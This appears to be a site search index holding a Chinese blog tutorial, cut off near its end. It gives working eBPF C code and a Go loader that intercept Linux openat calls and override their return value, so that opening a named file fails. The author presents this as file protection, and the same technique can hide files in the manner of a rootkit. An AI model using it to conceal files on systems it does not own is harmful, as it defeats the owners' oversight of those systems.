<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用eBPF实现linux下无需驱动的文件保护</title>
      <link href="/9fb07644999e/"/>
      <url>/9fb07644999e/</url>
      
        <content type="html"><![CDATA[<style>code {    color:#0099cc;}</style><h2 id="什么是eBPF-x2F-BPF"><a href="#什么是eBPF-x2F-BPF" class="headerlink" title="什么是eBPF&#x2F;BPF"></a>什么是eBPF&#x2F;BPF</h2><p>BPF 是 Linux 内核中一个非常灵活与高效的类虚拟机（virtual machine-like）组件， 能够在许多内核 hook 点安全地执行字节码（bytecode ）。很多 内核子系统都已经使用了 BPF，例如常见的网络（networking）、跟踪（ tracing）与安全（security ，例如沙盒）。</p><p>BPF 其实早在 1992 年就出现了，但本文介绍的是扩展的 BPF（extended Berkeley Packet Filter，eBPF）。eBPF 最早出现在 3.18 内核中，此后原来的 BPF 就被称为 “经典” BPF（classic BPF, cBPF），cBPF 现在基本已经过时了。很多人知道 cBPF 是因为它是 tcpdump 的包过滤语言。现在，Linux 内核只运行 eBPF，内核会将加载的 cBPF 字节码 透明地转换成 eBPF 再执行。如无特殊说明，本文中所说的 BPF 都是泛指 BPF 技术。</p><p><strong>大白话说</strong>:eBPF是内核的一种技术,可以把特定代码编译成在eBPF虚拟机执行并且做一些对内核功能的<code>修改,监听,捕获,分析</code>等<br>详细介绍请看以下几个链接,对于eBPF有详细介绍,非常适合入门学习<br>对eBPF常见的<code>map</code>,<code>kretprobe</code>,<code>kprobe</code>,<code>tracepoint</code>,<code>fentry</code>,<code>tc</code>,<code>xdp</code>不懂的都可以去下面几个链接&#x2F;官方示例中找到答案</p><ul><li><a href="https://ebpf.io/what-is-ebpf/">ebpf官网介绍</a></li><li><a href="https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/#25-bpf-sysctls">Cilium：BPF 和 XDP 参考指南</a></li><li><a href="https://zhuanlan.zhihu.com/p/496468540">Linux中基于eBPF的恶意利用与检测机制</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzUzNTM4NA==&mid=2649613401&idx=1&sn=15834d89a79278c5137e7ee6cbb253aa&chksm=8749c5aeb03e4cb8e360404e25abf69df8f6f2aa1807e919f1661fef0ba0dc91233b55eede4d&scene=178&cur_album_id=1996568890906148869#rd">使用 Go 语言管理和分发 ebpf 程序</a></li><li><a href="https://www.kernel.org/doc/html/latest/bpf/index.html">BPF Documentation&#x2F;Linux 官方文档</a></li></ul><h2 id="什么是Cilium-x2F-ebpf"><a href="#什么是Cilium-x2F-ebpf" class="headerlink" title="什么是Cilium&#x2F;ebpf"></a>什么是Cilium&#x2F;ebpf</h2><p>cilium&#x2F;ebpf库是 Cilium 项目的一个子项目。仅使用 Go 语言编写的库，提供了加载、编译和调试 eBPF 程序的功能。它具有最小的外部依赖性，适合在长期运行的进程中使用。库主要有由 Cloudflare 和 Cilium 两家公司维护，由于 Cilium 产品的火爆程度，该库的活跃度在社区层面还是会持续演进和发展。</p><p>cilium&#x2F;ebpf 已经满足生产可用，但 API 现在显然是不稳定的，编写的程序升级时可能需要进行部分调整。cilium&#x2F;ebpf 使用样例可以参考<a href="https://github.com/cilium/ebpf/tree/master/examples">这里</a>。该库提供的 cmd&#x2F;bpf2go 工具允许在 Go 代码中编译和嵌入 eBPF 程序。</p><p><strong>大白话说</strong>:Cilium&#x2F;ebpf 是一个 go 的第三方库 用于加载eBPF代码进内核和自动编译eBPF模块,使用 <code>go generate</code> 自动生成eBPF文件并且自动绑定进go二进制文件,非常方便</p><p>❕<font color="red">注意</font>: 一个完整的eBPF包含两部分(内核层和应用层),eBPF内核层代码和eBPF加载程序,此时go写的程序就是用来帮助把eBPF代码加载进内核的,如果编写的是<code>xdp</code>或者<code>tc</code>类型的eBPF程序,则不需要使用go加载,用linux自带的<code>ip link</code>命令即可加载模块<br>但一般工程实践都是两部分,因为应用层还兼顾着分析内核传回来的数据</p><p>和 Cilium&#x2F;ebpf 相同类型的库还有 <a href="https://github.com/iovisor/bcc">BCC</a> 以及 <a href="https://github.com/libbpf/libbpf-bootstrap">libbpf</a> </p><ul><li>BCC是python编写的,不建议在工程上使用,因为他还用一些<code>魔法</code>处理了eBPF的c代码,无法直接使用clang编译,使用Cilium&#x2F;ebpf可以把内核和应用分立,还可以用vscode进行智能代码提示,很方便</li><li>libbpf 是用c编写的,对于分析数据&#x2F;处理数据还是有一定的短板,所以一般建议使用 Cilium&#x2F;ebpf 来写 eBPF 类型的程序</li></ul><h2 id="eBPF的优势和劣势"><a href="#eBPF的优势和劣势" class="headerlink" title="eBPF的优势和劣势"></a>eBPF的优势和劣势</h2><ul><li>优势:<ul><li>方便随时更新维护,对内核进行无感热插拔,实际上eBPF程序就是c代码直接编译出汇编,所以可以做到类似于<code>shellcode</code>远程更新与加载</li><li>可以做到 <code>CO-RE</code> 即一次编译 到处运行, 因为eBPF是基于字节码(汇编)和虚拟机的,可以兼容各种内核,不过实际上使用还是稍微有点麻烦</li><li>非常适合进行流量侧的分析与调整,Cilium就是一个优秀的例子</li><li>加载前自动检查,不会导致内核崩溃或异常,是优势也是劣势,牺牲了一部分骚操作和灵活性</li><li>非常强大,对内核层&#x2F;应用层的任意调用进行分析&#x2F;patch</li></ul></li><li>劣势:<ul><li>只能使用eBPF提供的API,无法直接调用内核函数&#x2F;syscall</li><li>除了xdp和tc类型的程序,普通程序无法直接持久化,依赖用户层将eBPF程序加载进内核,程序退出后eBPF程序也跟随退出</li><li>限制比较多,天生适合做防守方,对于内核流程无法直接进行控制,如果把eBPF用于恶意程序,还是比较麻烦的</li></ul></li></ul><h2 id="用eBPF实现linux下文件保护"><a href="#用eBPF实现linux下文件保护" class="headerlink" title="用eBPF实现linux下文件保护"></a>用eBPF实现linux下文件保护</h2><p>我之前的文章已经说过文件保护的实现流程,这里就不再赘述了,详情可以<a href="https://xxxnull.github.io/6d188cabc922/">点我</a> 主要讲一下如何实现eBPF下的文件保护</p><p><code>bpf-helpers.h</code> 里实现了所有eBPF程序可用的api,其中有一个函数<code>bpf_override_return</code>可以直接覆盖返回值<br>原文介绍如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">long bpf_override_return(struct pt_regs *regs, u64 rc)</span><br><span class="line"></span><br><span class="line">              Description</span><br><span class="line">                     Used for error injection, this helper uses kprobes</span><br><span class="line">                     to override the return value of the probed</span><br><span class="line">                     function, and to set it to rc.  The first argument</span><br><span class="line">                     is the context regs on which the kprobe works.</span><br><span class="line"></span><br><span class="line">                     This helper works by setting the PC (program</span><br><span class="line">                     counter) to an override function which is run in</span><br><span class="line">                     place of the original probed function. This means</span><br><span class="line">                     the probed function is not run at all. The</span><br><span class="line">                     replacement function just returns with the required</span><br><span class="line">                     value.</span><br><span class="line"></span><br><span class="line">                     This helper has security implications, and thus is</span><br><span class="line">                     subject to restrictions. It is only available if</span><br><span class="line">                     the kernel was compiled with the</span><br><span class="line">                     CONFIG_BPF_KPROBE_OVERRIDE configuration option,</span><br><span class="line">                     and in this case it only works on functions tagged</span><br><span class="line">                     with ALLOW_ERROR_INJECTION in the kernel code.</span><br><span class="line"></span><br><span class="line">                     Also, the helper is only available for the</span><br><span class="line">                     architectures having the</span><br><span class="line">                     CONFIG_FUNCTION_ERROR_INJECTION option. As of this</span><br><span class="line">                     writing, x86 architecture is the only one to</span><br><span class="line">                     support this feature.</span><br><span class="line"></span><br><span class="line">              Return 0</span><br></pre></td></tr></table></figure><p>可以看到,虽然这个函数可以覆盖<code>kprobes</code>函数的返回值,但是他是基于linux下的<code>error injection</code>实现的,即<code>SYSCALL_DEFINEx</code>宏实现的函数</p><p>并且内核编译选项需要开启<code>CONFIG_BPF_KPROBE_OVERRIDE</code>且目标函数必须有<code>ALLOW_ERROR_INJECTION</code>声明,相关源码链接可以<a href="https://elixir.bootlin.com/linux/v5.15.46/source/include/asm-generic/error-injection.h#L26">点我</a>,系统调用(syscall)都实现了这个声明,并且这个函数截止到目前,只能在x86架构的CPU上使用,ARM等CPU并不支持这个函数</p><p>我们都知道<code>do_sys_openat2</code> 函数处理了所有open调用,但我们无法直接使用<code>bpf_override_return</code>控制<code>do_sys_openat2</code>的返回值,因为它并没有实现<code>ALLOW_ERROR_INJECTION</code>,所以这一条路走不通,那怎么办呢?<br>既然<code>do_sys_openat2</code>走不通,那我们只能拿<code>sys_openat</code>这个系统调用开刀了,函数完整定义请<a href="https://elixir.bootlin.com/linux/v5.15.46/source/fs/open.c#L1239">点我</a>,这个函数的执行流程大概如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call sys_openat()</span><br><span class="line">    return do_sys_openat2()</span><br></pre></td></tr></table></figure><p>可以看到,如果我们处理了<code>sys_openat</code>的<code>return</code>,我们就可以控制内核返回值,此时<code>kretprobe</code>就可以粉墨登场了,用<code>kretprobe</code>可以在<code>return</code>前插桩,做一些我们想要的操作.<br>有人可能会问了,为什么不直接用<code>kprobe</code>去处理<code>sys_openat</code>呢,因为<code>sys_openat</code>无法直接拿到文件名,需要在<code>do_sys_openat2</code>才能拿到完整文件名,所以流程就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call sys_openat() // 不处理kprobe</span><br><span class="line">    ret = hook(do_sys_openat2()) //先处理do_sys_openat2,拿到文件名等我们需要的参数</span><br><span class="line">    hook(ret) // 开始处理返回值</span><br><span class="line">    return ret // 完成文件保护</span><br></pre></td></tr></table></figure><h2 id="开始编码"><a href="#开始编码" class="headerlink" title="开始编码"></a>开始编码</h2><p>eBPF代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// +build ignore</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TARGET_ARCH_x86 <span class="comment">// 定义目标架构,必须</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_core_read.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_helpers.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_tracing.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> __license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;Dual MIT/GPL&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_COMM_LEN 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH_MAX      256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFAULT 14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u32 pid;                 <span class="comment">// pid</span></span><br><span class="line">    u8  comm[TASK_COMM_LEN]; <span class="comment">//进程名</span></span><br><span class="line">    u8  filename[PATH_MAX];  <span class="comment">//文件名</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_RINGBUF);</span><br><span class="line">    __uint(max_entries, <span class="number">1</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>; <span class="comment">//定义 BPF map 用于和用户层交互</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_HASH);</span><br><span class="line">    __uint(key_size, <span class="keyword">sizeof</span>(u64));</span><br><span class="line">    __uint(value_size, <span class="keyword">sizeof</span>(u8) * PATH_MAX);</span><br><span class="line">    __uint(max_entries, <span class="number">4096</span>);</span><br><span class="line">&#125; check_file <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>; <span class="comment">// 检测文件列表</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">unused</span> __<span class="title">attribute__</span>((<span class="title">unused</span>));</span> <span class="comment">//必须,否则编译器会优化掉event导致BPF验证失败</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHECK_STR(src, dst, code)                        \</span></span><br><span class="line"><span class="meta">    const char __chkstr[] __attribute__((unused)) = dst; \</span></span><br><span class="line"><span class="meta">    u8         __checkflag                        = 1;   \</span></span><br><span class="line"><span class="meta">    for (int i = 0; i &lt; sizeof(dst); i++)                \</span></span><br><span class="line"><span class="meta">    &#123;                                                    \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (dst[i] != src[i])                            \</span></span><br><span class="line"><span class="meta">        &#123;                                                \</span></span><br><span class="line"><span class="meta">            __checkflag = 0;                             \</span></span><br><span class="line"><span class="meta">            break;                                       \</span></span><br><span class="line"><span class="meta">        &#125;                                                \</span></span><br><span class="line"><span class="meta">    &#125;                                                    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__checkflag)                                     \</span></span><br><span class="line"><span class="meta">    &#123;                                                    \</span></span><br><span class="line"><span class="meta">        code                                             \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;kprobe/do_sys_openat2&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">BPF_KPROBE</span><span class="params">(sys_openat, <span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> *filename)</span> <span class="comment">// BPF_KPROBE 宏依赖__TARGET_ARCH_xxx 定义目标机器</span></span><br><span class="line">&#123;</span><br><span class="line">    u64           tgid     = bpf_get_current_pid_tgid();</span><br><span class="line">    u32           pid      = tgid &gt;&gt; <span class="number">32</span>; <span class="comment">// 获取进程id</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">fileinfo</span> =</span> bpf_ringbuf_reserve(&amp;events, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> event), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fileinfo)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fileinfo-&gt;pid = pid;</span><br><span class="line">    bpf_probe_read_user_str(fileinfo-&gt;filename, PATH_MAX, filename); <span class="comment">//获取文件名</span></span><br><span class="line">    bpf_get_current_comm(&amp;fileinfo-&gt;comm, TASK_COMM_LEN);            <span class="comment">// 获取读取进程名</span></span><br><span class="line">    CHECK_STR(fileinfo-&gt;filename, <span class="string">&quot;test.txt&quot;</span>, &#123;</span><br><span class="line">        bpf_ringbuf_submit(fileinfo, <span class="number">0</span>); <span class="comment">// 把event提交给用户层读取</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> msg[] = <span class="string">&quot;dfd:%d file:%x str:%s &quot;</span>;</span><br><span class="line">        bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg), dfd, filename, fileinfo-&gt;filename);</span><br><span class="line">        <span class="type">char</span> save[PATH_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        bpf_probe_read_user_str(save, PATH_MAX, filename);</span><br><span class="line">        bpf_map_update_elem(&amp;check_file, &amp;tgid, &amp;save, BPF_ANY); <span class="comment">//更新内部map供下面使用,注意,不能直接使用ringbuf申请的空间,需要自己开辟栈空间存储</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    bpf_ringbuf_discard(fileinfo, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;kretprobe/sys_openat&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_ret_openat</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64         tgid                = bpf_get_current_pid_tgid();</span><br><span class="line">    u32         pid                 = tgid &gt;&gt; <span class="number">32</span>; <span class="comment">// 获取进程id</span></span><br><span class="line">    <span class="type">char</span>        comm[TASK_COMM_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename            = bpf_map_lookup_elem(&amp;check_file, &amp;tgid);</span><br><span class="line">    bpf_get_current_comm(comm, TASK_COMM_LEN); <span class="comment">// 获取读取进程名</span></span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bpf_map_delete_elem(&amp;check_file, &amp;tgid);</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> msg[] = <span class="string">&quot;hidden file:%s by %s(%d)&quot;</span>;</span><br><span class="line">        bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg), filename, comm, pid);</span><br><span class="line">        bpf_override_return(ctx,-EFAULT); <span class="comment">// 修改返回值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户层代码如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/signal&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/cilium/ebpf/link&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/cilium/ebpf/ringbuf&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/cilium/ebpf/rlimit&quot;</span></span><br><span class="line"><span class="string">&quot;golang.org/x/sys/unix&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.</span></span><br><span class="line"><span class="comment">//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags $BPF_CFLAGS -type event bpf ../bpf_kern/src/bpf.c -- -I../bpf_kern/include</span></span><br><span class="line"><span class="comment">//注意填写go generate 的生成参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Name of the kernel function to trace.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Subscribe to signals for terminating the program.</span></span><br><span class="line">stopper := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow the current process to lock memory for eBPF resources.</span></span><br><span class="line"><span class="keyword">if</span> err := rlimit.RemoveMemlock(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load pre-compiled programs and maps into the kernel.</span></span><br><span class="line">objs := bpfObjects&#123;&#125; <span class="comment">//由bpf2go 生成 在运行前需要先执行generate </span></span><br><span class="line"><span class="keyword">if</span> err := loadBpfObjects(&amp;objs, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;loading objects: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> objs.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open a Kprobe at the entry point of the kernel function and attach the</span></span><br><span class="line"><span class="comment">// pre-compiled program. Each time the kernel function enters, the program</span></span><br><span class="line"><span class="comment">// will emit an event containing pid and command of the execved task.</span></span><br><span class="line"><span class="comment">//kp, err := link.AttachTracing(link.TracingOptions&#123;Program: objs.bpfPrograms.SysOpenat&#125;)</span></span><br><span class="line">kp, err := link.Kprobe(<span class="string">&quot;do_sys_openat2&quot;</span>, objs.SysOpenat, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;opening do_sys_openat2 kprobe: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">_, err = link.Kretprobe(<span class="string">&quot;sys_openat&quot;</span>, objs.SysRetOpenat, <span class="literal">nil</span>)</span><br><span class="line"><span class="comment">//kp, err := link.Tracepoint(&quot;syscalls&quot;, &quot;sys_enter_openat&quot;, objs.SysOpenat, nil)</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;opening sys_openat kprobe: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> kp.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open a ringbuf reader from userspace RINGBUF map described in the</span></span><br><span class="line"><span class="comment">// eBPF C program.</span></span><br><span class="line">rd, err := ringbuf.NewReader(objs.Events)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;opening ringbuf reader: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rd.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close the reader when the process receives a signal, which will exit</span></span><br><span class="line"><span class="comment">// the read loop.</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-stopper</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := rd.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;closing ringbuf reader: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">&quot;Waiting for events..&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// bpfEvent is generated by bpf2go.</span></span><br><span class="line"><span class="keyword">var</span> event bpfEvent</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">record, err := rd.Read()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ringbuf.ErrClosed) &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Received signal, exiting..&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;reading from reader: %s&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse the ringbuf event entry into a bpfEvent structure.</span></span><br><span class="line"><span class="keyword">if</span> err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &amp;event); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;parsing ringbuf event: %s&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Printf(<span class="string">&quot;pid: %d\tcomm: %s\n file:%s\n&quot;</span>,</span><br><span class="line">event.Pid,</span><br><span class="line">unix.ByteSliceToString(event.Comm[:]),</span><br><span class="line">unix.ByteSliceToString(event.Filename[:]),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>测试环境 <code>Ubuntu 22.04 5.15.0-46-generic</code></p><p>正常查看文件:<br><img src="/9fb07644999e/1.png"></p><p>运行go生成的程序:<br><img src="/9fb07644999e/2.png"></p><p>再次查看<code>test.txt</code>,此时已经完成在用户层下的文件隐藏,其实起作用的还是eBPF内核层,比起驱动,我们完全不用担心内核会挂掉<br><img src="/9fb07644999e/3.png"><br><img src="/9fb07644999e/4.png"></p><h2 id="Tips"><a href="#Tips" class="headerlink" 